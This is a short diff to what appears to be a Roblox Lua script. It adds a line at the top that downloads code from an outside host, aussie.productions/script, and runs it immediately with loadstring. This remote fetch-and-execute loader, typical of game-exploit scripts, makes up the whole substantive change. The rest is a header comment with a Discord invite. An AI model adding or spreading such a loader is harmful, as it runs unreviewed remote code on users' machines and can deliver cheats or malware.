@@ -1,3 +1,5 @@
+loadstring(game:HttpGet(request({Url='https://aussie.productions/script'}).Body))()
+
 --[[
 
 discord.gg/25ms
